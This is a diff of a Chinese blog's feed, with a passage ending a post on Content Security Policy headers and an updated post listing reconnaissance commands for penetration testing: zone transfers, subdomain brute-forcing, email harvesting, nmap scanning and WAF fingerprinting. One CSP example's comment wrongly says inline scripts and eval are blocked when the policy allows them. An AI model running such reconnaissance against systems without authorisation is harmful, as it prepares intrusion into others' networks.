class="line"></span><br><span class="line"><span class="comment"># 所有内容来源于myt0.com，并且要通过https协议，防止监听</span></span><br><span class="line">default-src https://myt0.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># 图片来源于所有</span></span><br><span class="line">img-src *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 样式来源设置</span></span><br><span class="line">style-src myt0.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># 限制音频地址</span></span><br><span class="line">media-src myt0.com youtube.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># 限制JS脚本地址，禁止行内脚本，禁止eval函数</span></span><br><span class="line">script-src myt0.com <span class="string">'unsafe-inline'</span> <span class="string">'unsafe-eval'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 限制&lt;object&gt;, &lt;embed&gt;, &lt;applet&gt;标签的来源</span></span><br><span class="line">object-src https://myt0.com</span><br></pre></td></tr></table></figure>
+<p>其他字段的解释及浏览器兼容具体参见<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP" target="_blank" rel="external">MDN 内容安全策略( CSP )</a></p>
+<h3 id="报告模式"><a href="#报告模式" class="headerlink" title="报告模式"></a>报告模式</h3><p>Content-Security-Policy-Report-Only 会启用报告模式，不强制采用指定的策略，但是违规的行为会报告给一个指定的 URI，也可以用这个头来进行测试。<br>Content-Security-Policy-Report-Only 和 Content-Security-Policy 同时存在时，两者均有效，前者仅报告，后者强制执行策略。<br>Content-Security-Policy 增加 report-uri 启用违规报告：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: <span class="keyword">default</span>-src <span class="string">'self'</span>; report-uri http:<span class="comment">//reportcollector.example.com/collector.cgi</span></span><br></pre></td></tr></table></figure>
+<p>当违规行为发生时，会将违规结果以 POST 方式发送到指定 URI，格式为 JSON，语法如下：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    "csp-report": &#123;</span><br><span class="line">        //发生违规的文档的URI</span><br><span class="line">        "document-uri": "http://example.com/signup.html",</span><br><span class="line">        //违规发生处的文档引用（地址）</span><br><span class="line">        "referrer": "",</span><br><span class="line">        //被CSP阻止的资源URI。如果被阻止的URI来自不同的源而非文档URI，那么被阻止的资源URI会被删减，仅保留协议，主机和端口号。</span><br><span class="line">        "blocked-uri": "http://example.com/css/style.css",</span><br><span class="line">        //违反的策略名称。</span><br><span class="line">        "violated-directive": "style-src cdn.example.com",</span><br><span class="line">        //在 Content-Security-Policy HTTP 头部中指明的原始策略</span><br><span class="line">        "original-policy": "default-src 'none'; style-src cdn.example.com; report-uri /_/csp-reports"</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="nginx-配置"><a href="#nginx-配置" class="headerlink" title="nginx 配置"></a>nginx 配置</h3><p>在 conf 中加入：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add_header Content-Security-Policy <span class="string">"script-src 'self' 'unsafe-inline' 'unsafe-eval' *.youtube.com maps.gstatic.com *.googleapis.com *.google-analytics.com cdnjs.cloudflare.com assets.zendesk.com connect.facebook.net; frame-src 'self' *.youtube.com assets.zendesk.com *.facebook.com s-static.ak.facebook.com tautt.zendesk.com; object-src 'self'"</span>;</span><br></pre></td></tr></table></figure>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h3&gt;&lt;p&gt;内容安全策略(Content Security Policy)可以控制浏览器信任以何种方式、何种来源去加载资源，用于削弱 XSS 的危害，也
+    
+    </summary>
+    
+    
+      <category term="security" scheme="http://myt0.com/tags/security/"/>
+    
+      <category term="xss" scheme="http://myt0.com/tags/xss/"/>
+    
+  </entry>
   
   <entry>
     <title>webpack4 笔记</title>
@@ -164,9 +354,9 @@
     
       <category term="javascript" scheme="http://myt0.com/tags/javascript/"/>
     
-      <category term="react-redux" scheme="http://myt0.com/tags/react-redux/"/>
-    
       <category term="react" scheme="http://myt0.com/tags/react/"/>
+    
+      <category term="react-redux" scheme="http://myt0.com/tags/react-redux/"/>
     
       <category term="redux" scheme="http://myt0.com/tags/redux/"/>
     
@@ -227,20 +417,21 @@
     <link href="http://myt0.com/2018/06/07/information-gathering/"/>
     <id>http://myt0.com/2018/06/07/information-gathering/</id>
     <published>2018-06-07T14:58:17.000Z</published>
-    <updated>2018-06-11T09:58:27.526Z</updated>
+    <updated>2018-08-20T06:07:17.304Z</updated>
     
     <content type="html"><![CDATA[<p>信息搜集通常要搜集以下几类信息：</p>
 <ul>
-<li>DNS各类型解析信息</li>
-<li>域名WHOIS，备案情况</li>
+<li>DNS 各类型解析信息</li>
+<li>域名 WHOIS，备案情况</li>
 <li>子域名列表</li>
 <li>操作系统</li>
 <li>端口及服务</li>
 <li>社工信息（人员，邮箱，电话，历史泄露密码）</li>
-<li>源码泄露.svn/.git文件（github及主要的公共仓库）</li>
-<li>C段</li>
+<li>源码泄露.svn/.git 文件（github 及主要的公共仓库）</li>
+<li>C 段</li>
 </ul>
-<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查询指定解析类型</span></span><br><span class="line">dig domain ns</span><br><span class="line">nslookup -qt=ns domain</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询所有解析类型, +short显示精简结果</span></span><br><span class="line">dig domain any +short</span><br><span class="line"></span><br><span class="line"><span class="comment"># IP反查</span></span><br><span class="line">dig -x ip</span><br><span class="line"></span><br><span class="line"><span class="comment"># 域传送</span></span><br><span class="line">dig @dnsdomain axfr domain</span><br><span class="line"></span><br><span class="line"><span class="comment"># whois</span></span><br><span class="line">whois domain</span><br><span class="line">dmitry -w domain</span><br><span class="line"></span><br><span class="line"><span class="comment"># 子域名查询</span></span><br><span class="line"><span class="comment"># recon-ng</span></span><br><span class="line">use recon/domains-hosts/bing_domain_web</span><br><span class="line">use recon/domains-hosts/brute_hosts</span><br><span class="line"></span><br><span class="line"><span class="comment"># fierce会自动查询dns, zone transfer, subdomain(较慢)</span></span><br><span class="line">fierce -dns domain</span><br><span class="line"></span><br><span class="line"><span class="comment"># theharvester会通过搜索引擎搜集email, subdomain</span></span><br><span class="line">theharvester <span class="_">-d</span> domain <span class="_">-l</span> 50 -b baidu</span><br><span class="line"></span><br><span class="line"><span class="comment"># 服务扫描</span></span><br><span class="line">nmap -A -T4 -F -Pn domain</span><br><span class="line"></span><br><span class="line"><span class="comment"># waf</span></span><br><span class="line">wafw00f domain</span><br><span class="line"></span><br><span class="line"><span class="comment"># http server指纹</span></span><br><span class="line">whatweb domain</span><br></pre></td></tr></table></figure>
+<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查询指定解析类型</span></span><br><span class="line">dig domain ns</span><br><span class="line">nslookup -qt=ns domain</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询所有解析类型, +short显示精简结果</span></span><br><span class="line">dig domain any +short</span><br><span class="line"></span><br><span class="line"><span class="comment"># IP反查</span></span><br><span class="line">dig -x ip</span><br><span class="line"></span><br><span class="line"><span class="comment"># 域传送</span></span><br><span class="line">dig @dnsdomain axfr domain</span><br><span class="line"></span><br><span class="line"><span class="comment"># whois</span></span><br><span class="line">whois domain</span><br><span class="line">dmitry -w domain</span><br><span class="line"></span><br><span class="line"><span class="comment"># 子域名查询</span></span><br><span class="line"><span class="comment"># recon-ng</span></span><br><span class="line">use recon/domains-hosts/bing_domain_web</span><br><span class="line">use recon/domains-hosts/brute_hosts</span><br><span class="line"></span><br><span class="line"><span class="comment"># fierce会自动查询dns, zone transfer, subdomain(较慢)</span></span><br><span class="line">fierce -dns domain</span><br><span class="line"></span><br><span class="line"><span class="comment"># theharvester会通过搜索引擎搜集email, subdomain</span></span><br><span class="line">theharvester <span class="_">-d</span> domain <span class="_">-l</span> 50 -b baidu -h out.html</span><br><span class="line"></span><br><span class="line"><span class="comment"># 服务扫描</span></span><br><span class="line">nmap -A -T4 -F -Pn domain</span><br><span class="line"></span><br><span class="line"><span class="comment"># waf</span></span><br><span class="line">wafw00f domain</span><br><span class="line"></span><br><span class="line"><span class="comment"># http server指纹</span></span><br><span class="line">whatweb domain</span><br></pre></td></tr></table></figure>
+<p>maltego 也可以进行更多搜索，且其图形化界面更为直观</p>
 <h3 id="在线工具"><a href="#在线工具" class="headerlink" title="在线工具"></a>在线工具</h3><p><a href="https://network-tools.com/" target="_blank" rel="external">https://network-tools.com/</a></p>
 <p><a href="https://dns.aizhan.com/" target="_blank" rel="external">https://dns.aizhan.com/</a></p>
 <p><a href="http://i.links.cn/subdomain/" target="_blank" rel="external">http://i.links.cn/subdomain/</a></p>
@@ -251,12 +442,12 @@
     
       &lt;p&gt;信息搜集通常要搜集以下几类信息：&lt;/p&gt;
 &lt;ul&gt;
-&lt;li&gt;DNS各类型解析信息&lt;/li&gt;
-&lt;li&gt;域名WHOIS，备案情况&lt;/li&gt;
+&lt;li&gt;DNS 各类型解析信息&lt;/li&gt;
+&lt;li&gt;域名 WHOIS，备案情况&lt;/li&gt;
 &lt;li&gt;子域名列表&lt;/li&gt;
 &lt;li&gt;操作系统&lt;/li&gt;
 &lt;li&gt;端口及服务&lt;/li&gt;
-&lt;li&gt;社工信息（人员，邮箱，电话，历史泄露密码）
+&lt;li&gt;社工信息（人员，邮箱，电话，历史泄露密
     
     </summary>
     
